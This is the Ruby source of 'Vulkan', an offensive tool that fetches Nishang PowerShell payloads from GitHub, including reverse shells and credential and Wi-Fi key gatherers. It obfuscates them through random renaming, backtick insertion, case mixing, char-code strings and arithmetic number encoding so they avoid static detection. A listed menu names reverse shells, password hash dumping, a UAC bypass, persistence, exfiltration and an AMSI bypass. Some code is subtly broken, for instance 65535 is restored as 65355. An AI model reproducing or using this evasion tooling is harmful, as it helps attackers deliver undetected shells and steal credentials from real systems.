#!/usr/bin/env ruby

# Vulkan: Offensive tool to create polymorphic Nishang payloads
# Author: D3Ext
# Github: https://github.com/D3Ext
# Blog: https://d3ext.github.io
# Contact: <d3ext@proton.me>

# Use this tool under your own responsability!

require "base64"
require "colorize"
require "httparty"

# This variable stores generated random strings to avoid collisions
$rand_values = []

# This array contains some of the most important cmdlets to iterate over them in case they're on the script to obfuscate its names
$known_funcs = ["Write-Verbose","Write-Output","Write-Error","Write-Warning","Get-Location","Out-String","Out-Null","Get-Command","Invoke-Expression","IEX","Get-ProcAddress","Copy-Item","New-Object","Get-ItemProperty","Get-Item","Set-ItemProperty","Get-ChildItem","Get-Content","Add-Member","Get-RegKeyClass","Set-Acl","Select-String","Test-Path","Add-Type","Get-WmiObject","Remove-Item","Select-Object","Write-Host","Get-Job","Remove-Job","Start-Job","Start-Sleep","ForEach-Object","Write-Progress","Write-Verbose","Get-Process","Get-Date","Out-File","Get-Service","Split-Path","New-Item","Set-WmiInstance"]

$known_text = ["([text.encoding]::ASCII).GetBytes(",".AcceptTcpClient()",".GetStream()",".Clear()",".Flush()",".Stop()",".Close()","","","","",""]

# This array holds all powershell internal variables to avoid overwriting them
$forbidden_vars = ["$true","$false","$null","$env","$read","$error","$verb","$_","$script","$IsWow64","$IsWow64Process"]

# This array contains all powershell characters with special uses when are combined with a backtick --> `
$no_backticks = ["0","a","b","e","f","n","r","t","v","-","_",".",":","!","(",")","{","}","[","]"]

$extra_statements = ["function","else","elseif","catch","except","break","while"]

$extreme = false
$verbose = false

# Print ASCII art banner
def ascii()
  banner = '╦  ╦┬ ┬┬  ┬┌─┌─┐┌┐┌
╚╗╔╝│ ││  ├┴┐├─┤│││
 ╚╝ └─┘┴─┘┴ ┴┴ ┴┘└┘
    by D3Ext v0.1
  '
  puts banner.red
end

# Generate a random string based on given length
# see here https://stackoverflow.com/questions/88311/how-to-generate-a-random-string-in-ruby
def randStr(num)
  o = [('a'..'z'), ('A'..'Z')].map(&:to_a).flatten
  
  if num < 3
    num = 3
  end

  while true
    rand_str = (0...num).map { o[rand(o.length)] }.join
    if $rand_values.include?(rand_str) == false
      $rand_values.append(rand_str)
      break
    end
    
    $rand_values.append(rand_str)
  end

  return rand_str
end

# This function receives a string, iterates
# over its characters using random numbers
# between 1 and 2 and then checks if it's
# even or odd to lowercase or upcase the character
# (i.e. Get-Command to geT-COMmaNd)
# It also helps with obfuscation specially when
# is combined with other techniques
def randCase(str_to_mod)
  mod_str = ""

  str_to_mod.split("").each { |str_char|
    rand_num = (1..2).to_a.sample

    if (rand_num % 2) == 0
      mod_str += str_char.downcase
    else
      mod_str += str_char.upcase
    end
  }

  return mod_str
end

# Obfuscation technique which adds ` between words
# to avoid static detection but avoid some special
# characters like: `n, `t, `e, `v, `b
# (i.e. Invoke-Mimikatz to `Inv`o`ke-`Mim`i`kat`z)
def addBackticks(str_to_mod)
  moded_str = ""

  str_to_mod.split("").each{ |str_char|
    if $no_backticks.include?(str_char) == true
      moded_str += str_char
      next
    else
      # Use random numbers to obfuscate it
      # as much as possible
      rand_num = (2..4).to_a.sample
      if (rand_num % 2) == 0
        moded_str += "`" + str_char
      else
        moded_str += str_char
      end
    end
  }

  return moded_str
end

# This function uses some powershell tricks
# to represent integers in different formats
def numObfs(num)
  if $extreme == false
    rand_num = (1..3).to_a.sample
  elsif $extreme == true
    rand_num = 3
  end

  if rand_num == 1
    # Use some logic to add and substract numbers
    moded_num = "$("

    zero_n = (1..5).to_a.sample
    zero_n.times do
      rand_num = (1..2).to_a.sample
      if (rand_num % 2) == 0
        moded_num += "+0"
      else
        moded_num += "-0"
      end
    end
    moded_num += "+" + num.to_s + ")"

  elsif rand_num == 2
    # Some simple number formatting
    moded_num = "+$((#{num}))"
  elsif rand_num == 3
    # Modified logic from first technique
    sample_num = (2..100).to_a.sample
    iterations = (1..3).to_a.sample
    moded_num = "$(" + (sample_num - 1).to_s + "-" + (sample_num - 1).to_s + "+" + "#{num}"

    iterations.times do
      moded_num += "+" + sample_num.to_s + "-" + sample_num.to_s
    end
    moded_num += ")"
  end

  return moded_num
end

# This function takes care of obfuscating
# cmdlet names (i.e. Invoke-Expression)
# with different techniques
def cmdletObfs(cmdlet)
  if $extreme == false
    rand_num = (1..3).to_a.sample
  elsif $extreme == true
    rand_num = 2
  end

  if rand_num == 1
    moded_str = addBackticks(randCase(cmdlet))
  elsif rand_num == 2
    moded_str = "&([string]::join('', ( ("
    cmdlet.bytes.map { |x|
      moded_str += x.to_s + ","
    }
    moded_str.chop! # Remove trailing comma
    moded_str += ") |%{ ( [" + randCase("char") + "][" + randCase("int") + "] $_)})))"
  elsif rand_num == 3
    raw_str = ""
    moded_str = "&((\""

    cmdlet.split("").each { |char|
      rand_num = (1..4).to_a.sample
      rand_str = randStr(rand_num)

      if (rand_num % 2) == 0
        moded_str += char + rand_str
        raw_str += char + rand_str
      else
        moded_str += rand_str + char
        raw_str += rand_str + char
      end
    }
    moded_str += "\")["
    
    cmdlet.split("").each { |char|
      moded_str += raw_str.index(char).to_s + ","
    }

    moded_str.chop!
    moded_str += "] -join '')"
  end

  return moded_str
end

# This function receives a string,
# obfuscates it with multiple techniques
# and then it return the modified text
def strObfs(str_to_mod)
  # Handle --extreme parameter
  if $extreme == false
    rand_num = (1..2).to_a.sample
  elsif $extreme == true
    rand_num = 2
  end

  if rand_num == 1
    moded_str = "([" + randCase("string") + "]::join('', ( ("
    str_to_mod[0].bytes.map { |b|
      moded_str += b.to_s + ","
    }
    moded_str.chop! # Remove trailing comma
    moded_str += ") |%{ ( [" + randCase("char") + "][" + randCase("int") + "] $_)})) | % {$_})"
  elsif rand_num == 2
    moded_str = "$("
    str_to_mod[0].bytes.map { |b|
      moded_str += "[" + randCase("char") + "]" + b.to_s + "+"
    }
    moded_str.chop!
    moded_str += ")"
  #elsif rand_num == 3
    #moded_str = ""
  end

  return moded_str
end

# Auxiliary logging function to create
# simple progress bars with given text
# and some delay
def pBar(text)
  print(text)
  3.times do
    sleep 0.2
    print(".")
  end
  sleep 0.2
  print("\n")
end

# Receive content to write to file and filename
def writeContent(f_content, output_file)
  f = File.open(output_file, "w")
  f.write(f_content)
end

def listPayloads()
  puts "Payloads                Categories          Descriptions"
  puts "--------                ----------          ------------"
  puts "Invoke-PowerShellTcp    Shells              Send a reverse shell via TCP to a port of an ip"
  puts "Invoke-PowerShellUdp    Shells              Send a reverse shell via UDP to a port of an ip"
  puts "Invoke-ConPtyShell      Shells              Send an interactive ConPty shell to a port of an ip"
  puts "Get-Information         Gather              Get some basic information about the system"
  puts "Get-WLAN-Keys           Gather              Display Wifi information and its stored credentials"
  puts "Get-PassHashes          Gather              Dump system credentials from registry hives"
  puts "Get-LSASecret           Gather              "
  puts "Invoke-PortScan         Scan                Scan open ports of the given ip"
  puts "Invoke-PsUACme          Escalation          Execute command(s) bypassing User Access Control (UAC) with high privileges"
  puts "Remove-Update           Escalation          Remove previous updates from system stealthily"
  puts "Add-Persistence         Utility             "
  puts "Add-Exfiltration        Utility             "
  puts "Download                Utility             "
  puts "Parse_Keys              Utility             "
  puts "Invoke-AmsiBypass       Bypassing           Bypass Anti Malware System Interface (AMSI) to avoid being detected with a dynamic one-liner command"

  exit(0)
end

def getPayload(payload)

  base_url = "https://raw.githubusercontent.com/samratashok/nishang/master/"

  if payload == "Invoke-PowerShellTcp"
    res = HTTParty.get(base_url + "Shells/Invoke-PowerShellTcp.ps1")
  elsif payload == "Invoke-PowerShellUdp"
    res = HTTParty.get(base_url + "Shells/Invoke-PowerShellUdp.ps1")
  elsif payload == "Get-Information"
    res = HTTParty.get(base_url + "Gather/Get-Information.ps1")
  elsif payload == "Get-WLAN-Keys"
    res = HTTParty.get(base_url + "Gather/Get-WLAN-Keys.ps1")
  end

  return res.body
end

def obfuscate(file_data)
  # Get all function names using regex
  pBar("[*] Replacing defined functions with random names")
  func_list = file_data.scan(/function [A-Za-z0-9_-]+/)
  func_list.each { |var_name|
    # Little delay to let the user read output
    sleep 0.1

    if !var_name.include? ":" # Check if function is defined as local to avoid errors
      func_name = var_name.split(" ")[1]
    else
      func_name = var_name.split(" ")[1].split(":")[1]
    end

    # Generate random string to replace with
    rand_name = randStr(func_name.length)
    file_data.gsub!(func_name, rand_name)
    if $verbose == true
      puts("  " + func_name + " --> " + rand_name)
    end
  }

  if $verbose
    puts()
  end

  # Get all variables
  pBar("[*] Finding and replacing variables with random names")
  all_raw_vars = file_data.scan(/\$[A-Za-z0-9_-]+/)
  # Remove duplicates
  all_raw_vars.uniq!

  # Delete some needed variables
  $forbidden_vars.each { |v|
    all_raw_vars.delete(v.upcase)
    all_raw_vars.delete(v.downcase)
    all_raw_vars.delete(v.capitalize)
  }

  all_raw_vars.each { |u_var|
    sleep 0.075 # Add little delay
    # Generate random string
    rand_var = "$" + randStr(u_var.length)
    file_data.gsub!(u_var, rand_var)
    # Print verbose info
    if $verbose
      puts("  " + u_var + " --> " + rand_var)
    end
  }

  if $verbose
    puts()
  end

  # Remove multi-line comments (text between <# and #>)
  pBar("[*] Remove comments")
  comments = file_data.scan(/(<#.*?#>)/m)
  comments.each { |str_lines|
    str_lines.each { |entry|
      file_data.gsub!(entry, "")
    }
  }
  # Remove all single line comments
  file_data.gsub!(/^\s*#.*$/, '')
  # Remove empty lines
  file_data.gsub!(/^(?:[\t ]*(?:\r?\n|\r))+/, '')

  # Replace newlines to fix format before obfuscating them
  file_data.gsub!("`r`n", "\n")
  file_data.gsub!("`n", "\n")

  # Get CLI parameters to not overwrite them
  parameters = file_data.scan(/ParameterSetName=\"(.*?)\"\)\]/i)

  # Find all strings between double quotes
  pBar("[*] Obfuscating strings")
  all_strs = file_data.scan(/\"(.*?)\"/m)
  all_strs.uniq!

  all_strs.each { |entry|
    if parameters.include?(entry) == false
      moded_str = strObfs(entry)
      file_data.gsub!("\"" + entry[0] + "\"", moded_str)
    end
  }

  pBar("[*] Obfuscating cmdlet names")
  $known_funcs.each { |func|
    if file_data.match?(/#{func}/i)
      sleep 0.075 # Add short delay
      moded_func = cmdletObfs(func)
      file_data.gsub!(/#{func}/i, moded_func)
      if $verbose
        puts("  " + func + " --> " + moded_func)
      end
    end
  }

  if $verbose
    puts()
  end

  # Replace some text to avoid possible errors
  file_data.gsub!("65535", "DO-NOT-REPLACE")

  pBar("[*] Obfuscating integers")
  #all_ints = file_data.scan(/\[char\](\d+)\+\[char\]/i)
  all_ints = file_data.scan(/(\d+)/)
  all_ints.uniq!

  all_ints.each { |i|
    puts i
    if i[0].to_i >= 24 && i[0].to_i <= 200
      rand_int = numObfs(i[0])
      file_data.gsub!(i[0], rand_int)
    end
  }

  # Replace double + signs to avoid powershell errors
  file_data.gsub!("++","+")

  file_data.gsub!("DO-NOT-REPLACE", "65355")

  return file_data
end

def main()
  # Print banner
  ascii()

  # Parse CLI flags
  text = getPayload("Invoke-PowerShellTcp")
  puts text

  # Open given file
  file = File.open("test.ps1")
  file_data = file.read
  file.close

  iterations = 1

  iterations.times do
    file_data = obfuscate(file_data)
  end

  writeContent(file_data, "moded.ps1")
  puts "[+] Obfuscated script written to ".green
end

main()

